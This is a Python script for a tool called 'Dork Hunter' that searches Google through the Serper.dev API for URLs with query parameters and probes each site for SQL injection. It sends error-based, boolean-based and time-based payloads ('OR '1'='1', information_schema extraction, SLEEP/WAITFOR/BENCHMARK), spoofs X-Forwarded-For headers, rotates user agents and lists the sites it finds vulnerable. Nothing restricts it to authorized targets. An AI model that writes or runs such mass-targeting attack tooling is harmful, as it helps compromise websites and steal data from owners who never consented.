import os
import random
import re
import time
import ssl
import logging
import getpass
import secrets
import requests
from concurrent.futures import ThreadPoolExecutor
from difflib import SequenceMatcher
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import csv
from typing import List, Set, Dict, Optional
from urllib3.util.ssl_ import create_urllib3_context
from urllib3.util.retry import Retry
import warnings

warnings.filterwarnings("ignore", category=DeprecationWarning)

DEFAULT_SCANNED_URLS_FILE = 'scanned_urls.txt'
DEFAULT_USER_AGENT_FILE = 'user_agents.txt'
DEFAULT_PAYLOADS_FILE = 'payloads.txt'
DEFAULT_REPORT_FILE = 'report.csv'
DEFAULT_LOG_FILE = 'scanner.log'
MAX_VULNERABLE_URLS = 10
REQUEST_TIMEOUT = (10, 20)
DELAY_BETWEEN_REQUESTS = (1, 3)
MAX_API_PAGES = 10
MAX_WORKERS = 5

SQL_ERROR_PATTERNS = [
    r"sql syntax.*mysql",
    r"warning.*mysql_.*",
    r"unclosed quotation mark",
    r"syntax error.*sql",
    r"ora-\d{5}",
    r"postgresql.*error",
    r"microsoft sql server.*error",
    r"db2 sql error"
]

logging.basicConfig(
    level=logging.WARNING,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler(DEFAULT_LOG_FILE)]
)
logger = logging.getLogger(__name__)
logger.propagate = False


class CustomSSLAdapter(requests.adapters.HTTPAdapter):
    def __init__(self, *args, **kwargs):
        self.ssl_context = create_urllib3_context()
        self.ssl_context.options |= ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3
        self.ssl_context.minimum_version = ssl.TLSVersion.TLSv1_2
        if hasattr(ssl.TLSVersion, "TLSv1_3"):
            self.ssl_context.maximum_version = ssl.TLSVersion.TLSv1_3
        try:
            self.ssl_context.options |= ssl.OP_NO_COMPRESSION
        except Exception:
            pass
        try:
            self.ssl_context.set_ciphers(
                "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:"
                "TLS_AES_128_GCM_SHA256:ECDHE+AESGCM:!SHA1:!MD5:!DES:!3DES:!RC4"
            )
        except Exception:
            pass
        super().__init__(*args, **kwargs)

    def init_poolmanager(self, *args, **kwargs):
        kwargs["ssl_context"] = self.ssl_context
        return super().init_poolmanager(*args, **kwargs)

    def proxy_manager_for(self, *args, **kwargs):
        kwargs["ssl_context"] = self.ssl_context
        return super().proxy_manager_for(*args, **kwargs)


class SqlScan:
    def __init__(self, api_key: str):
        self.api_key = api_key
        self.scanned_urls: Set[str] = set()
        self.user_agents: List[str] = []
        self.payloads: List[str] = []
        self.session = self._configure_session()
        self.initialize_components()
        self.verbose = False
        self.quiet_mode = False

    def _configure_session(self) -> requests.Session:
        session = requests.Session()
        base_retry_kwargs = {'total': 3, 'backoff_factor': 1, 'status_forcelist': [429, 500, 502, 503, 504]}
        try:
            retry_strategy = Retry(allowed_methods={"HEAD", "GET", "OPTIONS"}, **base_retry_kwargs)
        except TypeError:
            retry_strategy = Retry(method_whitelist={"HEAD", "GET", "OPTIONS"}, **base_retry_kwargs)
        tls_adapter = CustomSSLAdapter(max_retries=retry_strategy)
        session.mount("https://", tls_adapter)
        # HTTP adapter is intentionally required: this scanner targets arbitrary URLs,
        # including HTTP-only endpoints that are the actual vulnerability scan targets.
        # Reviewed and accepted: cleartext HTTP is a by-design requirement here.
        session.mount("http://", requests.adapters.HTTPAdapter(max_retries=retry_strategy))
        return session

    def initialize_components(self):
        self.scanned_urls = self.load_scanned_urls(DEFAULT_SCANNED_URLS_FILE)
        self.user_agents = self.load_file(DEFAULT_USER_AGENT_FILE)
        self.payloads = self.load_file(DEFAULT_PAYLOADS_FILE)
        if not self.user_agents:
            self.user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
            ]
        if not self.payloads:
            self.payloads = [
                "'",
                "' OR '1'='1",
                "' AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))--",
                "' OR EXISTS(SELECT 1 FROM information_schema.tables)--",
                "' WAITFOR DELAY '0:0:5'--"
            ]

    def load_file(self, file_path: str) -> List[str]:
        if not os.path.exists(file_path):
            logger.warning(f"File not found: {file_path}")
            return []
        with open(file_path, 'r', encoding='utf-8') as f:
            # Strip comment lines (e.g. payloads.txt section headers)
            return [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]

    def load_scanned_urls(self, scanned_urls_file: str) -> Set[str]:
        if os.path.exists(scanned_urls_file):
            with open(scanned_urls_file, 'r', encoding='utf-8') as f:
                return {line.strip() for line in f}
        return set()

    def save_scanned_url(self, url: str, scanned_urls_file: str = DEFAULT_SCANNED_URLS_FILE):
        with open(scanned_urls_file, 'a', encoding='utf-8') as f:
            f.write(url + '\n')

    def get_random_headers(self) -> Dict[str, str]:
        return {
            'User-Agent': secrets.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'X-Forwarded-For': ".".join(str(secrets.randbelow(254) + 1) for _ in range(4)),
        }

    def _with_param(self, url: str, param: str, value: str) -> str:
        parsed = urlparse(url)
        q = parse_qs(parsed.query, keep_blank_values=True)
        q[param] = [value]
        new_query = urlencode(q, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def dorking(self, dork: str, page: int) -> List[str]:
        search_url = "https://google.serper.dev/search"
        if page > MAX_API_PAGES:
            return []
        headers = {
            'X-API-KEY': self.api_key,
            'Content-Type': 'application/json',
        }
        payload = {'q': dork, 'num': 10, 'page': page}
        try:
            resp = self.session.post(search_url, headers=headers, json=payload, timeout=REQUEST_TIMEOUT)
            resp.raise_for_status()
            data = resp.json()
            items = data.get('organic', [])
            urls = [item['link'] for item in items if 'link' in item]
            time.sleep(random.uniform(*DELAY_BETWEEN_REQUESTS))
            return urls
        except requests.exceptions.HTTPError as e:
            logger.error(f"Serper HTTP error (page {page}): {e}")
        except requests.exceptions.RequestException as e:
            logger.error(f"Serper request error (page {page}): {e}")
        except Exception as e:
            logger.error(f"Serper parse error (page {page}): {e}")
        return []

    def extract_valid_urls(self, urls: List[str]) -> List[str]:
        valid = []
        for url in urls:
            if url in self.scanned_urls:
                continue
            if self.is_valid_url(url):
                valid.append(url)
        return valid

    def is_valid_url(self, url: str) -> bool:
        try:
            parsed = urlparse(url)
            query = parse_qs(parsed.query)
            if not query:
                return False
            sql_params = {'id', 'item', 'product', 'user', 'uid', 'pid', 'page', 'category', 'order', 'search', 'filter'}
            return any(p.lower() in sql_params for p in query.keys())
        except Exception:
            return False

    def test_connection(self, url: str) -> bool:
        try:
            resp = self.session.head(url, headers=self.get_random_headers(), timeout=10, allow_redirects=False)
            return resp.status_code < 400
        except Exception:
            return False

    def check_vulnerability(self, url: str) -> Optional[bool]:
        try:
            if not self.test_connection(url):
                logger.warning(f"Connection failed: {url}")
                return None
            parsed = urlparse(url)
            query = parse_qs(parsed.query)
            if not query:
                return None
            param = list(query.keys())[0]
            if not self._is_parameter_dynamic(url, param):
                self.save_scanned_url(url)
                return False
            result = self._test_payloads(url, parsed, query)
            self.save_scanned_url(url)
            return result
        except Exception as e:
            logger.error(f"Error checking {url}: {e}")
            return None

    def _is_parameter_dynamic(self, url: str, param: str) -> bool:
        try:
            original = self._make_request(url)
            if original is None:
                return False
            altered_url = self._with_param(url, param, "xyz123")
            altered = self._make_request(altered_url)
            if altered is None:
                return False
            return original != altered
        except Exception:
            return False

    def _make_request(self, url: str) -> Optional[str]:
        try:
            resp = self.session.get(url, headers=self.get_random_headers(), timeout=REQUEST_TIMEOUT, allow_redirects=False, verify=True)
            return resp.text
        except Exception:
            return None

    def _make_request_with_ssl_fallback(self, url: str) -> Optional[str]:
        """Fallback request with SSL verification disabled for sites with self-signed certs."""
        try:
            resp = self.session.get(url, headers=self.get_random_headers(), timeout=15, verify=False)
            return resp.text
        except Exception as e:
            logger.debug(f"SSL fallback also failed for {url}: {e}")
            return None

    def _fetch_response(self, test_url: str) -> Optional[str]:
        """Try primary request, then fall back to SSL-relaxed request if needed."""
        response = self._make_request(test_url)
        if response is None:
            response = self._make_request_with_ssl_fallback(test_url)
        return response

    def _test_error_based(self, url: str, parsed, param: str, values: List[str]) -> bool:
        """Test all payloads against a single parameter for error-based SQLi."""
        for value in values:
            for payload in self.payloads:
                try:
                    q = parse_qs(parsed.query, keep_blank_values=True)
                    q[param] = [value + payload]
                    test_url = urlunparse(parsed._replace(query=urlencode(q, doseq=True)))
                    response = self._fetch_response(test_url)
                    if response is None:
                        continue
                    if self._detect_sql_errors(response):
                        return True
                except Exception as e:
                    logger.debug(f"Payload test error on {url}: {e}")
        return False

    def _test_payloads(self, url: str, parsed, query) -> bool:
        """Orchestrator: run error-based, boolean-based and time-based checks per parameter."""
        for param, values in query.items():
            if self._test_error_based(url, parsed, param, values):
                return True
            if self._check_boolean_based(url, param):
                return True
            if self._check_time_based(url, param):
                return True
        return False

    def _detect_sql_errors(self, response_text: str) -> bool:
        if not response_text:
            return False
        text = response_text.lower()
        return any(re.search(pattern, text) for pattern in SQL_ERROR_PATTERNS)

    def _check_boolean_based(self, url: str, param: str) -> bool:
        # Use _with_param directly — avoids brittle split("=", 1) that breaks on values with "="
        true_values = ["1' AND '1'='1", "1' OR '1'='1", "1 AND 1=1"]
        false_values = ["1' AND '1'='2", "1' OR '1'='2", "1 AND 1=2"]
        base = self._make_request(url)
        if not base:
            return False
        for t_val in true_values:
            true_url = self._with_param(url, param, t_val)
            true_resp = self._make_request(true_url)
            if not true_resp:
                continue
            for f_val in false_values:
                false_url = self._with_param(url, param, f_val)
                false_resp = self._make_request(false_url)
                if not false_resp:
                    continue
                if self._calculate_difference(base, true_resp, false_resp):
                    return True
        return False

    def _calculate_difference(self, base: str, true_resp: str, false_resp: str) -> bool:
        if abs(len(true_resp) - len(false_resp)) > 100:
            return True
        # SequenceMatcher imported at top level — no nested import needed
        true_ratio = SequenceMatcher(None, base, true_resp).ratio()
        false_ratio = SequenceMatcher(None, base, false_resp).ratio()
        return abs(true_ratio - false_ratio) > 0.3

    def _check_time_based(self, url: str, param: str) -> bool:
        # Use _with_param directly to safely build URLs without brittle split("=", 1)
        time_values = [
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- ",
            "1' WAITFOR DELAY '0:0:5'-- ",
            "1 AND BENCHMARK(5000000,MD5(NOW()))"
        ]
        threshold = 4
        for val in time_values:
            start = time.time()
            test_url = self._with_param(url, param, val)
            self._make_request(test_url)
            elapsed = time.time() - start
            if elapsed >= threshold:
                return True
        return False

    def find_vulnerable_urls(self, dork: str, max_vulnerable: int) -> List[str]:
        vulnerable_urls: List[str] = []
        page = 1
        print(f"\n{'='*50}")
        print(f"Starting scan for dork: {dork}")
        print(f"{'='*50}\n")
        while len(vulnerable_urls) < max_vulnerable and page <= MAX_API_PAGES:
            print(f"[*] Processing page {page}...", end='\r')
            urls = self.dorking(dork, page)
            if not urls:
                print("\n[!] No more results from search engine")
                break
            valid_urls = self.extract_valid_urls(urls)
            if not valid_urls:
                page += 1
                continue
            with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
                results = list(executor.map(self.check_vulnerability, valid_urls))
            for u, result in zip(valid_urls, results):
                if result is True:
                    vulnerable_urls.append(u)
                    print(f"\n[+] VULNERABLE: {u}")
                elif result is None:
                    print(f"\n[-] SKIPPED: {u}")
                if len(vulnerable_urls) >= max_vulnerable:
                    break
            page += 1
            time.sleep(random.uniform(*DELAY_BETWEEN_REQUESTS))
        print(f"\n{'='*50}")
        print(f"Scan completed. Found {len(vulnerable_urls)} vulnerable URLs")
        print(f"{'='*50}\n")
        return vulnerable_urls


def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def center_text(text: str) -> str:
    try:
        terminal_width = os.get_terminal_size().columns
    except Exception:
        terminal_width = 80
    lines = text.split('\n')
    centered = [line.strip().center(terminal_width) for line in lines]
    return '\n'.join(centered)

def get_api_credentials():
    clear_console()
    banner = (
        " ██████╗  ██████╗ ██████╗ ██╗  ██╗    ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗\n"
        "██╔══██╗██╔═══██╗██╔══██╗██║ ██╔╝    ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗\n"
        "██║  ██║██║   ██║██████╔╝█████╔╝     ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝\n"
        "██║  ██║██║   ██║██╔══██╗██╔═██╗     ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗\n"
        "██████╔╝╚██████╔╝██║  ██║██║  ██╗    ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║\n"
        "╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝\n"
        "\t\n"
        "██████╗ ██╗   ██╗    ██╗  ██╗███████╗███╗   ██╗██╗  ██╗\n"	
        "██╔══██╗╚██╗ ██╔╝    ╚██╗██╔╝██╔════╝████╗  ██║╚██╗██╔╝ \n"	
        "██████╔╝ ╚████╔╝      ╚███╔╝ █████╗  ██╔██╗ ██║ ╚███╔╝ \n"	
        "██╔══██╗  ╚██╔╝       ██╔██╗ ██╔══╝  ██║╚██╗██║ ██╔██╗ \n"	
        "██████╔╝   ██║       ██╔╝ ██╗██║     ██║ ╚████║██╔╝ ██╗\n"	
        "╚═════╝    ╚═╝       ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═══╝╚═╝  ╚═╝\n"
    )
    print(center_text(banner))
    print(center_text("Powered by Serper.dev — Free Google Search API (no credit card required)"))
    print(center_text("Get your free API key at: https://serper.dev"))
    api_key = getpass.getpass("\nYour Serper.dev API key (input hidden): ").strip()
    return api_key

def get_dork_and_options():
    dork = input('Dork (example="inurl:product?id="): ').strip()
    max_vuln = input('Max Vulnerable URLs to find (Number, default 10): ').strip()
    max_vuln = int(max_vuln) if max_vuln.isdigit() else 10
    save_report = input("Save results to file? (Y/N): ").strip().lower() == 'y'
    return dork, max_vuln, save_report

def write_report(vulnerable_urls: List[str], filename: str = DEFAULT_REPORT_FILE):
    with open(filename, 'w', newline='', encoding='utf-8') as file:
        writer = csv.writer(file)
        writer.writerow(["Vulnerable URLs"])
        writer.writerows([[url] for url in vulnerable_urls])

def main():
    try:
        api_key = get_api_credentials()
        scanner = SqlScan(api_key)
        while True:
            dork, max_vuln, save_report = get_dork_and_options()
            clear_console()
            print("[*] Scanning started...\n")
            vulnerable_urls = scanner.find_vulnerable_urls(dork, max_vuln)
            if vulnerable_urls:
                print("\n[+] Vulnerable URLs found:")
                for i, url in enumerate(vulnerable_urls, 1):
                    print(f"{i}. {url}")
                if save_report:
                    write_report(vulnerable_urls)
                    print(f"\n[*] Results saved to {DEFAULT_REPORT_FILE}")
            else:
                print("\n[-] No vulnerable URLs found")
            choice = input("\n[?] Run another scan? (y/n): ").lower()
            if choice != 'y':
                print("\n[*] Exiting. Goodbye!")
                break
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
    except Exception as e:
        print(f"\n[!] Error: {str(e)}")

if __name__ == "__main__":
    main()
